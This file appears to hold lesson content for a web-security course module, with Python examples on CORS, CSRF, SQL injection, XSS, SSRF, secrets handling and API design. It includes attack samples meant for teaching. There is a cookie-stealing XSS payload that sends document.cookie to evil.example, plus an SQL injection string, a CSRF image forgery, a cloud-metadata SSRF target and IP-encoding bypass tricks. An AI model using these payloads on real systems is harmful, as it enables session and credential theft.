// Module 36 (Security), part B: web attacks, secrets, API design.
import { dd, r, type DeepDive } from './deepDive';

export const m36b: Record<string, DeepDive> = {
    'CORS': dd(
        [`<b>CORS</b> (Cross-Origin Resource Sharing) is a browser rule: a page from origin A may not read responses from origin B unless B opts in with <code>Access-Control-Allow-Origin</code> headers. An origin = scheme + host + port.`,
            r`from urllib.parse import urlparse
def origin(url):
    u = urlparse(url)
    return f"{u.scheme}://{u.netloc}"

print(origin("https://app.example.com/page"))
print(origin("https://app.example.com") == origin("https://api.example.com"))   # different host

# OUTPUT:
# https://app.example.com
# False`],
        [`The same-origin policy protects users: a malicious site must not read your bank page using your cookies. But legitimate front-ends on another origin (SPA at :3000, API at :8000) need a controlled exception.`,
            r`ALLOWED = {"https://app.example.com"}
def cors_headers(request_origin):
    if request_origin in ALLOWED:                       # explicit allow-list
        return {"Access-Control-Allow-Origin": request_origin, "Vary": "Origin"}
    return {}                                           # browser will block the read

print(cors_headers("https://app.example.com"))
print(cors_headers("https://evil.example"))

# OUTPUT:
# {'Access-Control-Allow-Origin': 'https://app.example.com', 'Vary': 'Origin'}
# {}`],
        [`In FastAPI use <code>CORSMiddleware</code> with explicit origins. Non-simple requests trigger a preflight <code>OPTIONS</code> request that the server must answer.`,
            r`from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],      # never "*" with credentials
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"],
    allow_credentials=True,
    max_age=600,                                    # cache preflight 10 minutes
)
print("middleware stack:", [m.cls.__name__ for m in app.user_middleware])

# OUTPUT:
# middleware stack: ['CORSMiddleware']`],
        [`<b>Advantages:</b> keeps the safe default (isolation) while allowing precise, server-controlled sharing between trusted origins.`,
            r`# Preflight decision for PUT with a custom header
def preflight(method, headers, allowed_methods={"GET", "POST"}):
    return method in allowed_methods
print("PUT allowed:", preflight("PUT", ["X-Custom"]))

# OUTPUT:
# PUT allowed: False`],
        [`<b>Disadvantages:</b> confusing errors, extra preflight round-trips, misconfiguration (reflecting any Origin, wildcard with credentials) turns it into a vulnerability.`,
            r`# Dangerous: echo back whatever Origin arrives
def bad_cors(origin): return {"Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true"}
print(bad_cors("https://evil.example")["Access-Control-Allow-Origin"], "<- attacker site can read user data")

# OUTPUT:
# https://evil.example <- attacker site can read user data`],
        [`<b>Limitations:</b> enforced only by browsers, so curl, scripts and attackers' servers ignore it; it is not authentication and does not stop CSRF-style sends.`,
            r`import urllib.request
# A script is not a browser: CORS never blocks it. Protect the API with auth, not CORS.
req = urllib.request.Request("http://127.0.0.1:9/private", headers={"Origin": "https://evil.example"})
print("server must still check credentials for", req.full_url)

# OUTPUT:
# server must still check credentials for http://127.0.0.1:9/private`],
        `
   Browser at https://app.example.com
        │ 1. OPTIONS /data  (preflight: Origin, Access-Control-Request-Method)
        ▼
   API https://api.example.com
        │ 2. 204 + Access-Control-Allow-Origin: https://app.example.com
        ▼
        │ 3. real request (GET/POST) allowed ──► JS can read response
   (no matching header ──► browser hides the response from JS)
`,
        `Prefer a same-origin deployment (reverse proxy serving UI and API under one host) to avoid CORS entirely. Otherwise use a strict allow-list per environment, never reflect Origin, avoid wildcard with credentials, and still authenticate every request: CORS is a browser convenience control, not a server security boundary.`
    ),

    'CSRF': dd(
        [`<b>Cross-Site Request Forgery</b> tricks a logged-in user's browser into sending an unwanted request (the browser automatically attaches cookies). The server cannot tell it from a real click unless it requires a secret the attacker cannot know.`,
            r`# evil.example page:  <img src="https://bank.example/transfer?to=attacker&amt=1000">
# The browser sends the victim's bank cookie with that request.
request = {"path": "/transfer", "cookie": "session=VALID", "origin": "https://evil.example"}
print("server sees valid session cookie:", request["cookie"].startswith("session"))

# OUTPUT:
# server sees valid session cookie: True`],
        [`State-changing endpoints that rely only on cookies for identity are exploitable from any website the user visits. Defences make requests prove they came from your own page.`,
            r`import secrets, hmac
SESSION = {"csrf": secrets.token_urlsafe(16)}              # stored server-side per session
def check(form_token):
    return hmac.compare_digest(SESSION["csrf"], form_token)

print("legit form:", check(SESSION["csrf"]))
print("forged    :", check("guess"))

# OUTPUT:
# legit form: True
# forged    : False`],
        [`Server-rendered forms use per-session CSRF tokens (Django middleware, Flask-WTF). APIs use <code>SameSite=Lax/Strict</code> cookies and require custom headers or Bearer tokens that browsers do not auto-send.`,
            r`from http.cookies import SimpleCookie
c = SimpleCookie()
c["sid"] = "abc"
c["sid"]["samesite"] = "Strict"        # cookie not sent on cross-site requests
c["sid"]["httponly"] = True
c["sid"]["secure"] = True
print(c.output())

# OUTPUT:
# Set-Cookie: sid=abc; HttpOnly; SameSite=Strict; Secure`],
        [`<b>Advantages of the defences:</b> SameSite cookies are a one-line browser-enforced fix; token checks are simple and framework-supported; Origin/Referer checks add defence in depth.`,
            r`def origin_ok(headers, host="bank.example"):
    from urllib.parse import urlparse
    o = headers.get("Origin") or headers.get("Referer", "")
    return urlparse(o).netloc == host
print(origin_ok({"Origin": "https://bank.example"}), origin_ok({"Origin": "https://evil.example"}))

# OUTPUT:
# True False`],
        [`<b>Disadvantages:</b> tokens must be wired into every form and AJAX call; SameSite behaviour differs between browsers and "Lax" still allows top-level GET navigation; subdomain takeover can bypass.`,
            r`# State change on GET is exploitable even with SameSite=Lax (top-level link click)
bad = "GET /delete_account"
good = "POST /delete_account (+ CSRF token)"
print("never mutate on:", bad.split()[0], "| use:", good.split()[0])

# OUTPUT:
# never mutate on: GET | use: POST`],
        [`<b>Limitations:</b> CSRF defences do not stop XSS (an attacker script can read the token); APIs using only Authorization headers are naturally immune, but cookie-authenticated APIs are not.`,
            r`# XSS defeats CSRF tokens: injected JS reads the token from the page and uses it
page_token = "tok-123"
injected_js_can_read = True
print("CSRF protection holds under XSS:", not injected_js_can_read)

# OUTPUT:
# CSRF protection holds under XSS: False`],
        `
   victim logged in to bank.example (cookie stored)
        │ visits evil.example
        ▼
   evil page auto-submits form ───► bank.example/transfer  (cookie attached!)
                                         │
        without token / SameSite ───────►│ executes transfer   (attack succeeds)
        with CSRF token / SameSite ─────►│ 403 rejected
`,
        `Use SameSite=Lax or Strict plus HttpOnly Secure cookies as the baseline, add synchronizer or double-submit tokens for browser forms, and require non-simple headers for APIs. Never change state on GET. For pure token-in-header APIs (no cookie auth) CSRF is not applicable, but protect against XSS since tokens in JS are stealable.`
    ),

    'SQL Injection': dd(
        [`<b>SQL injection</b> happens when user input is concatenated into a SQL string, letting an attacker change the query's meaning. The fix is <b>parameterised queries</b>: the driver sends SQL and values separately.`,
            r`import sqlite3
db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users(name TEXT, pw TEXT)")
db.execute("INSERT INTO users VALUES ('ada', 'x'), ('bob', 'y')")

name = "' OR '1'='1"                                    # attacker input
vulnerable = f"SELECT * FROM users WHERE name = '{name}'"
print(db.execute(vulnerable).fetchall())                # returns EVERY user

# OUTPUT:
# [('ada', 'x'), ('bob', 'y')]`],
        [`A single injectable field can leak, modify or delete the whole database or lead to remote code execution. It remains in the OWASP Top 10 because string-built queries are still common.`,
            r`import sqlite3
db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users(name TEXT)")
db.execute("INSERT INTO users VALUES ('ada')")
name = "' OR '1'='1"
safe = db.execute("SELECT * FROM users WHERE name = ?", (name,)).fetchall()   # placeholder
print(safe)                                             # treated purely as data

# OUTPUT:
# []`],
        [`Use placeholders in every driver (<code>?</code> in sqlite3, <code>%s</code> in psycopg), or an ORM (SQLAlchemy) that parameterises automatically. Identifiers (table/column names) cannot be parameters: use an allow-list.`,
            r`ALLOWED_SORT = {"name", "created_at"}
def build_order(col):
    if col not in ALLOWED_SORT:                         # identifiers: allow-list, not escaping
        raise ValueError("bad sort column")
    return f"ORDER BY {col}"
print(build_order("name"))
try: build_order("name; DROP TABLE users")
except ValueError as e: print("blocked:", e)

# OUTPUT:
# ORDER BY name
# blocked: bad sort column`],
        [`<b>Advantages of parameterisation:</b> complete protection for values, driver handles quoting and types, queries can be cached and planned once, code is easier to read.`,
            r`import sqlite3
db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE t(a INT)")
db.executemany("INSERT INTO t VALUES (?)", [(1,), (2,), (3,)])   # batch with params
print(db.execute("SELECT SUM(a) FROM t WHERE a > ?", (1,)).fetchone())

# OUTPUT:
# (5,)`],
        [`<b>Disadvantages:</b> dynamic queries (variable filters, IN lists) tempt developers back to string building; ORMs still allow raw SQL and unsafe <code>text()</code> usage.`,
            r`ids = [1, 2, 3]
placeholders = ",".join("?" * len(ids))                 # build the placeholders, not the values
sql = f"SELECT * FROM t WHERE id IN ({placeholders})"
print(sql)

# OUTPUT:
# SELECT * FROM t WHERE id IN (?,?,?)`],
        [`<b>Limitations:</b> parameters protect data, not logic: an over-privileged DB account still lets a successful injection do damage; stored procedures built with dynamic SQL stay vulnerable.`,
            r`# Least privilege limits blast radius
grants = {"app_user": ["SELECT", "INSERT", "UPDATE"], "admin": ["ALL"]}
print("app can DROP:", "DROP" in grants["app_user"] or "ALL" in grants["app_user"])

# OUTPUT:
# app can DROP: False`],
        `
   BAD :  "SELECT * FROM users WHERE name = '" + input + "'"
                                             └─ input becomes SQL code
   GOOD:  cursor.execute("SELECT * FROM users WHERE name = ?", (input,))
              │ SQL text ────────► parser (structure fixed)
              └ values  ─────────► bound as data only
`,
        `Parameterise everything, use an ORM or query builder by default, allow-list dynamic identifiers, give the app a least-privilege DB role, and add static analysis (bandit) and WAF as depth, not as the fix. Review any raw SQL in code review as a security-sensitive change.`
    ),

    'XSS': dd(
        [`<b>Cross-Site Scripting</b> is injecting attacker-controlled HTML or JavaScript into a page that other users view. The script then runs with the victim's session and can steal tokens or act as the user. Defence: output encoding, templates with auto-escape, and CSP.`,
            r`user_comment = '<script>fetch("https://evil.example/?c="+document.cookie)</script>'
page = f"<div class='comment'>{user_comment}</div>"      # unsafe: raw interpolation
print(page)

# OUTPUT:
# <div class='comment'><script>fetch("https://evil.example/?c="+document.cookie)</script></div>`],
        [`Anywhere user text is shown (comments, profile names, search echoes) is a potential injection point. One XSS defeats cookies, CSRF tokens and authentication for that user.`,
            r`import html
user_comment = '<script>alert(1)</script>'
print(html.escape(user_comment))          # & < > " ' become harmless entities

# OUTPUT:
# &lt;script&gt;alert(1)&lt;/script&gt;`],
        [`Jinja2 auto-escapes when <code>autoescape=True</code> (Flask enables it for .html); React escapes by default; the danger zones are <code>|safe</code>, <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code> and URL attributes.`,
            r`from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(["html"]))
tpl = env.from_string("<p>Hello {{ name }}</p>")
print(tpl.render(name="<b>x</b>"))

# OUTPUT:
# <p>Hello &lt;b&gt;x&lt;/b&gt;</p>`],
        [`<b>Advantages of the defences:</b> auto-escaping templates fix the common case by default; CSP blocks inline scripts even if one slips through; HttpOnly cookies hide the session from JS.`,
            r`csp = "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'"
headers = {"Content-Security-Policy": csp, "X-Content-Type-Options": "nosniff"}
print(headers["Content-Security-Policy"].split(";")[1].strip())

# OUTPUT:
# script-src 'self'`],
        [`<b>Disadvantages:</b> context matters (HTML body vs attribute vs JS vs URL need different encoding); rich-text features need a sanitizer; strict CSP breaks inline scripts and is hard to retrofit.`,
            r`import html
# html.escape is right for HTML text, but not for a javascript: URL
href = "javascript:alert(1)"
print(html.escape(href))                  # unchanged! still dangerous in <a href=...>
print("allow only http(s) schemes:", href.startswith(("http://", "https://")))

# OUTPUT:
# javascript:alert(1)
# allow only http(s) schemes: False`],
        [`<b>Limitations:</b> escaping on input is wrong (encode at output, per context); DOM-based XSS happens entirely client-side and server escaping cannot see it; third-party scripts widen the surface.`,
            r`# Sanitise rich text with an allow-list library (pip install bleach / nh3)
import re
def strip_scripts(s): return re.sub(r"(?is)<script.*?</script>", "", s)   # NOT sufficient alone!
print(strip_scripts("<img src=x onerror=alert(1)>"))     # regex misses event handlers

# OUTPUT:
# <img src=x onerror=alert(1)>`],
        `
   attacker ─ posts <script>…</script> ─► DB (stored)
                                            │
   victim opens page ◄── server renders ◄───┘
        │ (unescaped)             │ escape at output + CSP
        ▼                         ▼
   script runs as victim      shown as plain text
   steals session/token       nothing executes
`,
        `Encode at output by context, rely on auto-escaping templates, ban raw HTML insertion in code review, sanitise rich text with a maintained allow-list library, set a strict CSP (nonces), HttpOnly Secure SameSite cookies, and Trusted Types for DOM sinks. Treat any use of safe/innerHTML as a security exception to justify.`
    ),

    'SSRF': dd(
        [`<b>Server-Side Request Forgery</b>: an attacker makes your server fetch a URL of their choosing (webhook, image-by-URL, PDF render), reaching internal systems such as <code>http://169.254.169.254/</code> (cloud metadata) that the attacker cannot reach directly.`,
            r`import urllib.request
def fetch_preview(url):                  # VULNERABLE: fetches anything it is told to
    return urllib.request.urlopen(url, timeout=3).read()

# attacker supplies: http://169.254.169.254/latest/meta-data/iam/security-credentials/
print("server would call its own cloud metadata service and return IAM credentials")

# OUTPUT:
# server would call its own cloud metadata service and return IAM credentials`],
        [`Servers sit inside trusted networks. Any feature that makes outbound requests from user input turns the server into a proxy into that network, exposing databases, admin panels and cloud credentials.`,
            r`import ipaddress, socket
def is_internal(host):
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    return ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
for h in ["localhost", "127.0.0.1", "169.254.169.254"]:
    print(h, is_internal(h))

# OUTPUT:
# localhost True
# 127.0.0.1 True
# 169.254.169.254 True`],
        [`Typical places: webhook testers, "import from URL", avatar fetchers, link previews, XML/PDF processors. Fix with an allow-list of domains, resolving and validating IPs, blocking redirects, and network egress rules.`,
            r`from urllib.parse import urlparse
ALLOWED_HOSTS = {"api.partner.com", "cdn.example.com"}
def validate(url):
    u = urlparse(url)
    if u.scheme != "https" or u.hostname not in ALLOWED_HOSTS:
        raise ValueError("blocked")
    return url
print(validate("https://api.partner.com/hook"))
try: validate("http://169.254.169.254/")
except ValueError as e: print(e)

# OUTPUT:
# https://api.partner.com/hook
# blocked`],
        [`<b>Advantages of strong controls:</b> allow-lists are simple and effective, IMDSv2 on AWS requires a token header, and egress firewalls add a safety net regardless of app bugs.`,
            r`# IMDSv2 needs a PUT to get a token first - a simple GET SSRF no longer works
steps = ["PUT /latest/api/token (header X-aws-ec2-metadata-token-ttl-seconds)",
         "GET /latest/meta-data/ with X-aws-ec2-metadata-token"]
print(len(steps), "steps; blind GET-only SSRF fails")

# OUTPUT:
# 2 steps; blind GET-only SSRF fails`],
        [`<b>Disadvantages:</b> bypasses are inventive: DNS rebinding (name resolves to a public IP at check time, internal at use time), redirects, decimal/octal IPs, IPv6, URL parser differences.`,
            r`import ipaddress
print(ipaddress.ip_address(int("2130706433")))          # decimal form of 127.0.0.1
# http://2130706433/ is loopback; naive string checks for "127." miss it

# OUTPUT:
# 127.0.0.1`],
        [`<b>Limitations:</b> validating the hostname once is not enough (TOCTOU with DNS): connect to the validated IP itself and disable redirects; blind SSRF gives no response body but can still hit internal actions.`,
            r`import requests
def safe_get(url):
    # validate first, then refuse redirects so a 302 cannot point inward
    return requests.get(url, timeout=3, allow_redirects=False)
print("allow_redirects=False closes the redirect bypass")

# OUTPUT:
# allow_redirects=False closes the redirect bypass`],
        `
   attacker ──► "fetch http://169.254.169.254/..." ──► your API server
                                                          │ trusted network
                                                          ▼
                                    internal admin / metadata / DB (no external access)
   defence:  allow-list host ─► resolve ─► reject private IPs ─► no redirects ─► egress firewall
`,
        `Layer controls: avoid fetching user URLs at all when possible; otherwise route through a dedicated egress proxy with allow-lists, run it in an isolated network segment, enforce IMDSv2, and block private ranges at the firewall. Resolve once and connect to the pinned IP to defeat DNS rebinding.`
    ),

    'Secrets Management': dd(
        [`<b>Secrets</b> (API keys, DB passwords, tokens, private keys) must stay out of source code and images. They are supplied at run time from environment variables, mounted files, or a secrets manager (Vault, AWS Secrets Manager, Azure Key Vault, Doppler).`,
            r`import os
# BAD : API_KEY = "sk-live-abc123"      # committed to git forever
# GOOD: read from the environment at start-up and fail fast if missing
def need(name):
    v = os.environ.get(name)
    if not v:
        raise RuntimeError(f"missing secret: {name}")
    return v
os.environ["API_KEY"] = "demo"
print(need("API_KEY"))

# OUTPUT:
# demo`],
        [`Leaked secrets in git, logs or images are one of the most common breach causes; bots scan GitHub within seconds of a push. Rotation and least privilege limit the damage.`,
            r`import re
# Simple secret scanner (real tools: gitleaks, trufflehog, GitHub push protection)
PATTERNS = {"AWS key": r"AKIA[0-9A-Z]{16}", "generic": r"(?i)(password|secret)\s*=\s*['\"][^'\"]+['\"]"}
code = 'password = "hunter2"\nregion = "eu-west-1"'
for name, p in PATTERNS.items():
    if re.search(p, code): print("FOUND:", name)

# OUTPUT:
# FOUND: generic`],
        [`Local dev uses git-ignored <code>.env</code> files; CI uses encrypted repository secrets; production uses a managed secret store with IAM, auditing and rotation; Kubernetes mounts Secrets (encrypt etcd at rest).`,
            r`from pathlib import Path
def load_dotenv_simple(path=".env"):
    env = {}
    p = Path(path)
    if p.exists():
        for line in p.read_text().splitlines():
            if line.strip() and not line.startswith("#"):
                k, _, v = line.partition("=")
                env[k.strip()] = v.strip()
    return env
print(load_dotenv_simple("does-not-exist.env"))     # .gitignore must list .env

# OUTPUT:
# {}`],
        [`<b>Advantages:</b> central control, audit logs, automatic rotation, per-service access policies, short-lived dynamic credentials (Vault database engine), no secret sprawl.`,
            r`# Short-lived credentials: leak window is minutes, not forever
import time
creds = {"user": "v-app-123", "expires": time.time() + 900}
print("ttl seconds ~", int(creds["expires"] - time.time()))

# OUTPUT (varies):
# ttl seconds ~ 899`],
        [`<b>Disadvantages:</b> extra infrastructure and a new dependency (outage = cannot start), bootstrapping problem (how does the app authenticate to the vault?), developer friction.`,
            r`# The "secret zero" problem: something must authenticate first
chain = ["pod identity / IAM role", "-> fetch DB password from vault", "-> connect to DB"]
print(" ".join(chain))

# OUTPUT:
# pod identity / IAM role -> fetch DB password from vault -> connect to DB`],
        [`<b>Limitations:</b> a process that uses a secret can still leak it (logs, error pages, memory dumps); env vars are visible to the process tree; rotation requires apps to reload credentials.`,
            r`import logging
class Redact(logging.Filter):
    def filter(self, record):
        record.msg = str(record.msg).replace("hunter2", "***")
        return True
log = logging.getLogger("app"); log.addFilter(Redact())
logging.basicConfig(format="%(message)s")
log.warning("login failed for password=hunter2")

# OUTPUT:
# login failed for password=***`],
        `
   developer laptop      CI/CD                 production
   .env (git-ignored)    encrypted secrets     Vault / AWS Secrets Manager
         │                    │                      │ IAM identity
         └────────► env vars / mounted files ◄───────┘
                            │
                         app reads at start ──► never in git, image, or logs
`,
        `Never commit secrets; enable push protection and scanners, rotate on any suspicion, and prefer workload identity (OIDC, IAM roles) over static keys. Use short-lived dynamic credentials, mount secrets as files rather than env vars where possible, and design the app to reload rotated values without redeploy.`
    ),

    'Secure API Design': dd(
        [`Secure API design builds protections into the contract: authentication, object-level authorization, input validation, rate limiting, minimal data exposure, safe errors and auditing. The OWASP API Security Top 10 is the checklist.`,
            r`from pydantic import BaseModel, Field
class CreateUser(BaseModel):                       # validate at the boundary
    email: str = Field(pattern=r"^[^@\s]+@[^@\s]+\.[a-z]{2,}$")
    age: int = Field(ge=13, le=120)
try:
    CreateUser(email="not-an-email", age=5)
except Exception as e:
    print(type(e).__name__, "-> 422 Unprocessable Entity")

# OUTPUT:
# ValidationError -> 422 Unprocessable Entity`],
        [`APIs expose business logic directly to attackers and automation. Common failures: broken object-level authorization, excessive data exposure, no rate limit, mass assignment, verbose errors.`,
            r`# Excessive data exposure: return only what the client needs
db_row = {"id": 7, "email": "a@x.com", "password_hash": "$argon2...", "is_admin": False}
class PublicUser:                                   # explicit response schema
    FIELDS = ("id", "email")
    @classmethod
    def dump(cls, row): return {k: row[k] for k in cls.FIELDS}
print(PublicUser.dump(db_row))

# OUTPUT:
# {'id': 7, 'email': 'a@x.com'}`],
        [`Real systems front APIs with a gateway (TLS, auth, quotas), use versioned routes, idempotency keys for payments, pagination caps, signed webhooks and audit logs.`,
            r`import time
class RateLimiter:                                  # fixed window, per key
    def __init__(self, limit, window): self.limit, self.window, self.hits = limit, window, {}
    def allow(self, key):
        now = int(time.time() // self.window)
        bucket = self.hits.setdefault(key, [now, 0])
        if bucket[0] != now: bucket[:] = [now, 0]
        bucket[1] += 1
        return bucket[1] <= self.limit
rl = RateLimiter(3, 60)
print([rl.allow("user1") for _ in range(5)])

# OUTPUT:
# [True, True, True, False, False]`],
        [`<b>Advantages:</b> fewer incidents, predictable behaviour for clients, easier compliance (SOC2, GDPR), schema-first validation also gives documentation and generated clients.`,
            r`# Mass assignment defence: never accept is_admin from the client
ALLOWED = {"name", "email"}
payload = {"name": "Ada", "email": "a@x.com", "is_admin": True}
clean = {k: v for k, v in payload.items() if k in ALLOWED}
print(clean)

# OUTPUT:
# {'name': 'Ada', 'email': 'a@x.com'}`],
        [`<b>Disadvantages:</b> more design and review effort, stricter schemas slow rapid prototyping, rate limits and auth add latency and operational complexity.`,
            r`# Trade-off example: sequential integer IDs leak volume and enable enumeration
import uuid
print("int id:", 1001, "-> guessable | uuid4:", uuid.uuid4().version, "-> unguessable (still check authz!)")

# OUTPUT:
# int id: 1001 -> guessable | uuid4: 4 -> unguessable (still check authz!)`],
        [`<b>Limitations:</b> design controls cannot stop stolen valid credentials, business-logic abuse (coupon farming), or flaws in dependencies; unguessable IDs are not authorization.`,
            r`# Safe errors: do not leak internals to the client
def handle(exc):
    log = f"internal: {type(exc).__name__}: {exc}"       # keep details in server logs
    return {"error": "internal_error", "request_id": "req-7f3a"}, log
body, _ = handle(KeyError("users_table"))
print(body)

# OUTPUT:
# {'error': 'internal_error', 'request_id': 'req-7f3a'}`],
        `
   client ─TLS─► gateway ──► authN ──► rate limit ──► input validation (schema)
                                                           │
                                         object-level authZ (owner check)
                                                           │
                                       business logic ──► minimal response model
                                                           │
                          audit log + safe error format ◄──┘
`,
        `Adopt secure defaults by construction: schema validation at the edge, deny-by-default authorization with centralised policy, response models that whitelist fields, quotas per identity, idempotency and audit trails. Threat-model new endpoints, run SAST/DAST and dependency audits in CI, and design for revocation, versioning and graceful deprecation.`
    ),
};
